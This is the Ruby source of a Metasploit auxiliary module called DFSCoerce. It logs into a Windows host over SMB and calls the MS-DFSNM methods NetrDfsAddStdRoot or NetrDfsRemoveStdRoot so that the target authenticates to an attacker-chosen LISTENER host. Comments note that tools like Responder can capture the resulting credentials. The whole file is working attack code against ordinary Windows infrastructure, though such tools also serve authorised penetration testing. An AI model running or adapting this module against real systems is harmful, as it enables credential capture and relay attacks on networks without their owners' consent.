##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'windows_error'
require 'ruby_smb'
require 'ruby_smb/error'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Auxiliary::Scanner

  Dfsnm = RubySMB::Dcerpc::Dfsnm

  METHODS = %w[NetrDfsAddStdRoot NetrDfsRemoveStdRoot].freeze

  def initialize
    super(
      'Name' => 'DFSCoerce',
      'Description' => %q{
        Coerce an authentication attempt over SMB to other machines via MS-DFSNM methods.
      },
      'Author' => [
        'Wh04m1001',
        'xct_de',
        'Spencer McIntyre'
      ],
      'References' => [
        [ 'URL', 'https://github.com/Wh04m1001/DFSCoerce' ]
      ],
      'License' => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('LISTENER', [ true, 'The host listening for the incoming connection', Rex::Socket.source_address ]),
        OptEnum.new('METHOD', [ true, 'The RPC method to use for triggering', 'Automatic', ['Automatic'] + METHODS ])
      ]
    )
  end

  def connect_dfsnm
    vprint_status('Connecting to Distributed File System (DFS) Namespace Management Protocol')
    netdfs = @tree.open_file(filename: 'netdfs', write: true, read: true)

    vprint_status('Binding to \\netdfs...')
    netdfs.bind(endpoint: RubySMB::Dcerpc::Dfsnm)
    vprint_good('Bound to \\netdfs')

    netdfs
  end

  def run_host(_ip)
    begin
      connect
    rescue Rex::ConnectionError => e
      fail_with(Failure::Unreachable, e.message)
    end

    begin
      smb_login
    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
      fail_with(Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e}).")
    end

    begin
      @tree = simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Failure::Unreachable, "Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).")
    end

    begin
      dfsnm = connect_dfsnm
    rescue RubySMB::Error::UnexpectedStatusCode => e
      if e.status_code == ::WindowsError::NTStatus::STATUS_ACCESS_DENIED
        fail_with(Failure::NoAccess, 'Connection failed (STATUS_ACCESS_DENIED)')
      end

      fail_with(Failure::UnexpectedReply, "Connection failed (#{e.status_code.name})")
    rescue RubySMB::Dcerpc::Error::FaultError => e
      elog(e.message, error: e)
      fail_with(Failure::UnexpectedReply, "Connection failed (DCERPC fault: #{e.status_name})")
    end

    begin
      case datastore['METHOD']
      when 'NetrDfsAddStdRoot'
        dfsnm.netr_dfs_add_std_root(datastore['LISTENER'], 'share', comment: Faker::Hacker.say_something_smart)
      when 'NetrDfsRemoveStdRoot', 'Automatic'
        # use this technique by default, it's the original and doesn't require a comment
        dfsnm.netr_dfs_remove_std_root(datastore['LISTENER'], 'share')
      end
    rescue RubySMB::Dcerpc::Error::DfsnmError => e
      case e.status_code
      when ::WindowsError::Win32::ERROR_ACCESS_DENIED
        # this should be the response even if LISTENER captured the credentials (MSF, Responder, etc.)
        print_good('Server responded with ERROR_ACCESS_DENIED which indicates that the attack was successful')
      when ::WindowsError::Win32::ERROR_BAD_NETPATH
        # this should be the response even if LISTENER was inaccessible
        print_good('Server responded with ERROR_BAD_NETPATH which indicates that the attack was successful')
      else
        print_status("Server responded with #{e.status_code.name} (#{e.status_code.description})")
      end
    end
  end
end
